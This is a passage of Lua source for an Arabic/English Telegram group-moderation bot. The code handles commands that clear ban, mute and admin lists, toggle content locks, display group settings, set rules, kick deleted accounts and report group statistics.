faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 41, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:vipmem:'..msg.chat_id_)
end
if txt[2] == 'filterlist' or txts[2] == 'قائمه المنع' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Filterlist has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح قائمه المنع  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 36, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:filters:'..msg.chat_id_)
end
if txt[2] == 'mutelist' or txts[2] == 'المكتومين' then
hxousedx1:del(HXOUSE..'bot:muted:'..msg.chat_id_)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Muted users list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المكتومين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 34, string.len(msg.sender_user_id_))
end
end
end
end
if text == 'مسح الرابط' and hxouse11(msg) then
hxousedx1:del(HXOUSE.."bot:group:link"..msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙تم مسح رابط المجموعه ', 1, 'md')
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Cc]lean (.*)$") or text:match("^مسح (.*)$") and hxouse11(msg) then
local txt = {string.match(text, "^([Cc]lean) (.*)$")}
local txts = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'قائمه المنع العام' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Freelist has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح قائمه المنع العام  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 42, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:freewords:')
end
if txt[2] == 'owners' or txts[2] == 'المدراء' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ owner list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المدراء  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 32, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:owners:'..msg.chat_id_)
end
if txt[2] == 'monsh' or txts[2] == 'المنشئين الاساسيين' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ monsh list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المنشئين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 33, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:monsh:'..msg.chat_id_)
end
if txt[2] == 'momod all' or txts[2] == 'الادمنيه العامين' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Mod all list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح الادمنيه العامين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 41, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:moall:')
end
if txt[2] == 'vip all' or txts[2] == 'المميزين عام' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ vip all list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المميزين عام  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 37, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:vpall:')
end
if txt[2] == 'ownerall' or txts[2] == 'المدراء العامين' then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Mod list has been cleared ', 1, 'md')
else
local hxouse = '⌯︙ تم مسح المدراء العامين  \n⌯︙بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, hxouse, 40, string.len(msg.sender_user_id_))
end
hxousedx1:del(HXOUSE..'bot:onall:')
end
end
end
if text:match("^مسح القوائم$") and hxouse11(msg) then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ هذه الخاصيه للمنشئ والرتب الاعلى منه ', 1, 'md')
else
hxousedx1:del(HXOUSE..'bot:banned:'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:momod:'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:donky:'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:vipmem:'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:filters:'..msg.chat_id_)
hxousedx1:del(HXOUSE..'bot:muted:'..msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم مسح المحظورين \n⌯︙ تم مسح الادمنيه \n⌯︙ تم مسح المميزين \n⌯︙ تم مسح المطاية \n⌯︙ تم مسح قائمه المنع \n⌯︙ تم مسح المكتومين \nٴ… … … … … … … … … … …➖➖➖\n⌯︙ تم مسح هذه القوائم بواسطه '..renk_hxouse(msg)..' ', 1, 'md')
end
end
if text:match("^تفعيل الحمايه القصوى$") or text:match("^قفل التفليش$") and hxouse11(msg) then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ هذه الخاصيه للمنشئ والرتب الاعلى منه ', 1, 'md')
else
hxousedx1:set(HXOUSE..'bot:links:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:forward:mute'..msg.chat_id_,true)
hxousedx1:del(HXOUSE..'lock:get:photo'..msg.chat_id_)
hxousedx1:set(HXOUSE..'bot:bots:ban'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'anti-flood:'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:video:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:gifs:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'bot:sticker:mute'..msg.chat_id_,true)
hxousedx1:set(HXOUSE..'farsiban'..msg.chat_id_,true)
hxousedx1:del(HXOUSE.."fshar"..msg.chat_id_)
hxousedx1:del(HXOUSE.."taf"..msg.chat_id_)
hxousedx1:del(HXOUSE.."kaf"..msg.chat_id_)
hxousedx1:set(HXOUSE..'floodstatus'..msg.chat_id_,'Kicked')
hxousedx1:set('HXOUSE:id:photo'..msg.chat_id_,true)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل جلب الصوره \n⌯︙ تم قفل البوتات بالطرد \n⌯︙ تم قفل التكرار \n⌯︙ تم قفل الروابط \n⌯︙ تم قفل التوجيه \n⌯︙ تم قفل الملصقات \n⌯︙ تم قفل المتحركه \n⌯︙ تم قفل الفيديو \n⌯︙ تم قفل الفشار \n⌯︙ تم قفل الكفران \n⌯︙ تم قفل الطائفيه  \n💬┇ تم وضع التكرار بالطرد \n⌯︙ تم قفل الفارسيه بالطرد \n⌯︙ تم وضع الايدي بدون صوره \nٴ… … … … … … … … … … …\n⌯︙ تم تفعيل الحمايه القصوى بواسطه { '..renk_hxouse(msg)..' } ', 1, 'md')
end
end
------------------------------HXOUSE TEAM-----------------------------------------------------------------   
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]ettings$") or text:match("^الاعدادات$") and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'bot:muteall'..msg.chat_id_) then
mute_all = 'مفعل 🌟'
else
mute_all = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:text:mute'..msg.chat_id_) then
mute_text = 'مفعل 🌟'
else
mute_text = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:photo:mute'..msg.chat_id_) then
mute_photo = 'مفعل 🌟'
else
mute_photo = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:video:mute'..msg.chat_id_) then
mute_video = 'مفعل 🌟'
else
mute_video = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:gifs:mute'..msg.chat_id_) then
mute_gifs = 'مفعل 🌟'
else
mute_gifs = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'anti-flood:'..msg.chat_id_) then
mute_flood = 'مفعل 🌟'
else
mute_flood = 'معطل ༯'
end
------------hxouse
if not hxousedx1:get(HXOUSE..'flood:max:'..msg.chat_id_) then
flood_m = 5
else
flood_m = hxousedx1:get(HXOUSE..'flood:max:'..msg.chat_id_)
end
------------hxouse
if not hxousedx1:get(HXOUSE..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250
else
spam_c = hxousedx1:get(HXOUSE..'bot:sens:spam'..msg.chat_id_)
end
------------hxouse
if hxousedx1:get(HXOUSE..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بالمسح ??"
elseif hxousedx1:get(HXOUSE..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بالطرد ༯"
elseif not hxousedx1:get(HXOUSE..'floodstatus'..msg.chat_id_) then
floodstatus = "بالمسح 🌟"
end
----------------------------------------------------hxouse
if hxousedx1:get(HXOUSE..'bot:music:mute'..msg.chat_id_) then
mute_music = 'مفعل 🌟'
else
mute_music = 'معطل ༯'
end
------------faedee
if hxousedx1:get(HXOUSE..'bot:bots:ban'..msg.chat_id_) then
mute_bots = 'مفعل 🌟'
else
mute_bots = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:inline:mute'..msg.chat_id_) then
mute_in = 'مفعل 🌟'
else
mute_in = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:cmds'..msg.chat_id_) then
mute_cmd = 'مفعل 🌟'
else
mute_cmd = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:voice:mute'..msg.chat_id_) then
mute_voice = 'مفعل 🌟'
else
mute_voice = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'editmsg'..msg.chat_id_) then
mute_edit = 'مفعل 🌟'
else
mute_edit = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مفعل 🌟'
else
mute_links = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:pin:mute'..msg.chat_id_) then
lock_pin = 'مفعل 🌟'
else
lock_pin = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:sticker:mute'..msg.chat_id_) then
lock_sticker = 'مفعل 🌟'
else
lock_sticker = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:tgservice:jk'..msg.chat_id_) then
lock_tgservice = 'مفعل 🌟'
else
lock_tgservice = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:webpage:mute'..msg.chat_id_) then
lock_wp = 'مفعل 🌟'
else
lock_wp = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:strict'..msg.chat_id_) then
strict = 'مفعل 🌟'
else
strict = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:hashtag:mute'..msg.chat_id_) then
lock_htag = 'مفعل 🌟'
else
lock_htag = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'tags:lock'..msg.chat_id_) then
lock_tag = 'مفعل 🌟'
else
lock_tag = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:location:mute'..msg.chat_id_) then
lock_location = 'مفعل 🌟'
else
lock_location = 'معطل 🚸'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:contact:mute'..msg.chat_id_) then
lock_contact = 'مفعل 🌟'
else
lock_contact = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:english:mute'..msg.chat_id_) then
lock_english = 'مفعل 🌟'
else
lock_english = 'معطل ༯'
end
------------fader
if hxousedx1:get(HXOUSE..'bot:arabic:mute'..msg.chat_id_) then
lock_arabic = 'مفعل 🌟'
else
lock_arabic = 'معطل ༯'
end
------------fader
if hxousedx1:get(HXOUSE..'bot:forward:mute'..msg.chat_id_) then
lock_forward = 'مفعل 🌟'
else
lock_forward = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:document:mute'..msg.chat_id_) then
lock_file = 'مفعل 🌟'
else
lock_file = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE..'markdown:lock'..msg.chat_id_) then
markdown = 'مفعل 🌟'
else
markdown = 'معطل ??'
end
------------hxouse
if hxousedx1:get(HXOUSE..'bot:spam:mute'..msg.chat_id_) then
lock_spam = 'مفعل 🌟'
else
lock_spam = 'معطل ༯'
end
------------hxouse
if hxousedx1:get(HXOUSE.."bot:welcome"..msg.chat_id_) then
send_welcome = 'مفعل 🌟'
else
send_welcome = 'معطل ༯'
end
------------hxouse
local TXTAR = "⌯︙ اعدادات المجموعه 🔻 :\n\n"
.."⌯︙ قفل الحمايه  "..strict.."\n"
.."⌯︙ قفل الكل  "..mute_all.."\n"
.."⌯︙ قفل الشارحه  "..mute_cmd.."\n\n"
.."⌯︙ اعدادات اخرى:🔻 :\n\n"
.."⌯︙ قفل الكلايش  "..lock_spam.."\n"
.."⌯︙ قفل الروابط  "..mute_links.."\n"
.."️⌯︙ قفل الشبكات  "..lock_wp.."\n"
.."⌯︙ قفل المعرف  "..lock_tag.."\n"
.."⌯︙ قفل الهاشتاك  "..lock_htag.."\n"
.."⌯︙ قفل التوجيه  "..lock_forward.."\n"
.."⌯︙ قفل البوتات   "..mute_bots.."\n"
.."⌯︙ قفل العديل   "..mute_edit.."\n"
.."⌯︙ قفل التثبيت  "..lock_pin.."\n"
.."⌯︙ قفل الاونلاين  "..mute_in.."\n"
.."⌯︙ قفل العربيه   "..lock_arabic.."\n"
.."⌯︙ قفل الانكليزيه  "..lock_english.."\n"
.."⌯︙ قفل الماركداون  "..markdown.."\n"
.."️⌯︙ قفل الاشعارات  "..lock_tgservice.."\n"
.."⌯︙ قفل التكرار  "..mute_flood.."\n"
.."⌯︙ خاصيه التكرار  "..floodstatus.."\n"
.."⌯︙ عدد التكرار  [ "..flood_m.." ]\n"
.."️⌯︙ عدد السبام  [ "..spam_c.." ]\n\n"
.."⌯︙ المزيد من الاعدادات 🔻 :\n\n"
.."⌯︙ قفل الدردشه  "..mute_text.."\n"
.."⌯︙ قفل الصور  "..mute_photo.."\n"
.."⌯︙ قفل الفيديو  "..mute_video.."\n"
.."⌯︙ قفل المتحركه  "..mute_gifs.."\n"
.."⌯︙ قفل الاغاني  "..mute_music.."\n"
.."⌯︙ قفل الصوت  "..mute_voice.."\n"
.."⌯︙ قفل الملفات  "..lock_file.."\n"
.."⌯︙ قفل الملصقات  "..lock_sticker.."\n"
.."⌯︙ قفل الجهات  "..lock_contact.."\n"
.."️ ⌯︙ قفل المواقع  "..lock_location.."\n"
local TXTEN = "⚙ Group Settings :\n\n"
.."◾️ *Strict Mode* : "..strict.."\n"
.."◾️ *Group lock All* : "..mute_all.."\n"
.."◾️ *Case of no answer* : "..mute_cmd.."\n\n"
.."⚠️ *Centerial Settings* :\n\n"
.."◾️ *Lock Spam* : "..lock_spam.."\n"
.."◾️ *Lock Links* : "..mute_links.."\n"
.."️◾️ *Lock Web-Page* :  "..lock_wp.."\n"
.."◾️ *Lock Tag* : "..lock_tag.."\n"
.."️◾️ *Lock Hashtag* : "..lock_htag.."\n"
.."◾️ *Lock Forward* : "..lock_forward.."\n"
.."◾️ *Lock Bots* :  "..mute_bots.."\n"
.."️◾️ *Lock Edit* :  "..mute_edit.."\n"
.."️◾️ *Lock Pin* : "..lock_pin.."\n"
.."◾️ *Lock Inline* : "..mute_in.."\n"
.."◾️ *Lock arabic* :  "..lock_arabic.."\n"
.."◾️ *Lock English* : "..lock_english.."\n"
.."◾️ *Lock MarkDown* : "..markdown.."\n"
.."️◾️ *Lock TgService* : "..lock_tgservice.."\n"
.."◾️ *Lock Flood* : "..mute_flood.."\n"
.."◾️ *Flood Status* : "..floodstatus.."\n"
.."◾️ *Flood Sensitivity* : [ "..flood_m.." ]\n"
.."️◾️ *Spam Sensitivity* : [ "..spam_c.." ]\n\n"
.." 🔇 *Media Settings* :\n\n"
.."◽️ *Lock Text* : "..mute_text.."\n"
.."◽️ *Lock Photo* : "..mute_photo.."\n"
.."◽️ *Lock Videos* : "..mute_video.."\n"
.."◽️ *Lock Gifs* : "..mute_gifs.."\n"
.."◽️ *Lock Music* : "..mute_music.."\n"
.."◽️ *Lock Voice* : "..mute_voice.."\n"
.."◽️ *Lock File* : "..lock_file.."\n"
.."◽️ *Lock Sticker* : "..lock_sticker.."\n"
.."◽️ *Lock Contact* : "..lock_contact.."\n"
.."️◽️ *Lock location* : "..lock_location.."\n"
TXTEN = TXTEN:gsub("yse༯","yse༯")
TXTEN = TXTEN:gsub("#no","'no'")
TXTEN = TXTEN:gsub("بالمسح","Deleting")
TXTEN = TXTEN:gsub("بالطرد","Kicking")
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, TXTEN, 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, TXTAR, 1, 'md')
end
end
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
if text:match("^كول (.*)$")  then
local txt = {string.match(text, "^(كول) (.*)$")}
hxousedx(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
-----------------
if (text and text == 'enable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if not hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'bot:lang:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *Reply bot is already enabled*️ ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل ردود البوت سابقا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'bot:lang:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *Reply bot has been enable*️ ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل ردود البوت ', 1, 'md')
hxousedx1:del(HXOUSE..'bot:rep:mute'..msg.chat_id_)
end
end
end
if (text and text == 'disable reply bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable Reply Bot') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل ردود البوت') and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'bot:rep:mute'..msg.chat_id_) then
if hxousedx1:get(HXOUSE..'bot:lang:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *Reply bot is already disabled*️ ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل ردود البوت سابقا ', 1, 'md')
end
else
if hxousedx1:get(HXOUSE..'bot:lang:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *Reply bot has been disabled*️ ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل ردود البوت ', 1, 'md')
hxousedx1:set(HXOUSE..'bot:rep:mute'..msg.chat_id_,true)
end
end
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etrules (.*)$") then
local txt = {string.match(text, "^([Ss]etrules) (.*)$")}
hxousedx1:set(HXOUSE..'bot:rules'..msg.chat_id_, txt[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group rules has been saved ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع قوانين المجموعه ', 1, 'md')
end
end
if text:match("^ضع قوانين (.*)$") and hxouse11(msg) then
local txt = {string.match(text, "^(ضع قوانين) (.*)$")}
hxousedx1:set(HXOUSE..'bot:rules'..msg.chat_id_, txt[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group rules has been saved ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم وضع قوانين المجموعه ', 1, 'md')
end
end
end
-------------------------------------------HXOUSE TEAM----------------------------------------------------
if text:match("^ضع ملاحظه (.*)$") and is_leader(msg) then
local txt = {string.match(text, "^(ضع ملاحظه) (.*)$")}
hxousedx1:set(HXOUSE..'owner:note1', txt[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Saved ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم حفظ الملاحظه ارسل جلب الملاحظه لعرضها ', 1, 'md')
end
end
---------------------------------------HXOUSE TEAM--------------------------------------------------------
if text:match("^جلب الملاحظه$") and is_leader(msg) then
local note = hxousedx1:get(HXOUSE..'owner:note1')
hxousedx(msg.chat_id_, msg.id_, 1, note, 1, nil)
end
-----------------------------------HXOUSE TEAM--------------------------------------------------------------
if text:match("^[Rr]ules$") or text:match("^القوانين$") then
local rules = hxousedx1:get(HXOUSE..'bot:rules'..msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
-----------------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^الروابط$") and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'bot:links:mute'..msg.chat_id_) then
mute_links = 'مقفوله 🌟'
else
mute_links = 'مفتوحه ༯'
end
local hxouse = "⌯︙ اعدادات الروابط 🔻 :\n\n"
.." الروابط : "..mute_links.."\n"
hxousedx(msg.chat_id_, msg.id_, 1, hxouse, 1, 'md')
end
end
---------------------------------------------HXOUSE TEAM--------------------------------------------------
if text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Group name has been changed ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تغيير اسم المجموعه ', 1, 'md')
end
end
--------------------------------------------HXOUSE TEAM---------------------------------------------------
if text:match("^ضع صوره$") and is_owner(msg.sender_user_id_, msg.chat_id_) and hxouse11(msg) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Plese send group photo ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ارسل لي الصوره الان ', 1, 'md')
end
hxousedx1:set(HXOUSE..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
-----------------------------------------------------------------------------------------------
if text:match('^gplist$') or text:match('^المجموعات$') then
local list = hxousedx1:smembers(HXOUSE.."bot:groups")
local t = '⌯︙ مجموعات البوت \n\n'
for k,v in pairs(list) do
t = t..k.." - {`"..v.."`}\n" 
end
if #list == 0 then
t = '⌯︙ لا يوجد مجموعات مفعله '
end
hxousedx(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end
----------------------------by faede-------------------------------------------------------------------
if text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
unpinmsg(msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم الغاء تثبيت الرساله ', 1, 'md')
end
------------------------------by hxouse-----------------------------------------------------------------
if text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local pin_id = hxousedx1:get(HXOUSE..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم اعاده تثبيت الرساله ', 1, 'md')
else
end
end       
-----------------------------------------------------------------------------------------------
if text:match("^kick delete$") or text:match("^طرد الحسابات المحذوفه$") and hxouse11(msg) then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end
end
getUser(v.user_id_, cleanaccounts, nil)
end 
hxousedx(msg.chat_id_, msg.id_, 0,'⌯︙ تم طرد الحسابات المحذوفه ', 1, 'md')
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--------------------------------------------------------------------------------clean kicked
if text:match("^clean kicked$") or text:match("^تنظيف قائمه الحظر$") and hxouse11(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
hxousedx(msg.chat_id_, msg.id_, 0,'⌯︙ لا يوجد محظورين ', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
hxousedx1:del(HXOUSE..'bot:banned:'..msg.chat_id_)
x = x + 1
end 
hxousedx(msg.chat_id_, msg.id_, 0,'⌯︙ تم مسح ('..x..') ', 1, 'md')
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end 
-----------------------------------------------------------------------------------------------
if text:match("^(gpinfo)$") or text:match("^معلومات المجموعه$") and hxouse11(msg) then
function gpinfo(arg,data)
-- vardump(data) 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n⌯︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n⌯︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n⌯︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
-----------
if text:match('^كشف (-%d+)') and hxouse11(msg) then
local chattid = text:match('كشف (-%d+)') 
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطورين فقط ', 1, 'md')
else
function Faeder_re(arg,data)
function hxouse(f1,f2)
function hxouse333(t1,t2)
local list = hxousedx1:smembers(HXOUSE.."bot:monsh:" .. chattid)
if list[1] or list[2] or list[3] or list[4] then
user_info = hxousedx1:get(HXOUSE.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
end
if user_info then
monsh = user_info
else
monsh = "لا يوجد"
end
local Monsh = hxousedx1:scard(HXOUSE.."bot:monsh:" .. chattid) or "0"
local Baned = hxousedx1:scard(HXOUSE.."bot:banned:" .. chattid) or "0"
local Owner = hxousedx1:scard(HXOUSE.."bot:owners:" .. chattid) or "0"
local Muted = hxousedx1:scard(HXOUSE.."bot:muted:" .. chattid) or "0"
local Tkeed = hxousedx1:scard(HXOUSE.."bot:keed:" .. chattid) or "0"
local Momod = hxousedx1:scard(HXOUSE.."bot:momod:" .. chattid) or "0"
local Vip = hxousedx1:scard(HXOUSE.."bot:vipmem:" .. chattid) or "0"
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
hxousedx1:set(HXOUSE.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@HXOUSEiq")) 
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ المنشئ ⌯» ["..monsh.."]\n\n⌯︙الرابط ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/HXOUSEiq")..")\n⌯︙ايديها ⌯» *"..msg.chat_id_.."*\n⌯︙عدد الاعضاء ⌯» *"..data.member_count_.."* \n⌯︙ عدد المدراء   ⌯» *"..Owner.."*\n⌯︙ عدد المنشئين   ⌯» *"..Monsh.."*\n⌯︙ عدد الادمنيه   ⌯» *"..Momod.."*\n⌯︙ عدد المكتومين  ⌯» *"..Muted.."*\n⌯︙ عدد المحظورين ⌯» *"..Baned.."*\n⌯︙ عدد المقيدين   ⌯» *"..Tkeed.."*\n⌯︙ عدد المميزين  ⌯» *"..Vip.."*\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(chattid).ID
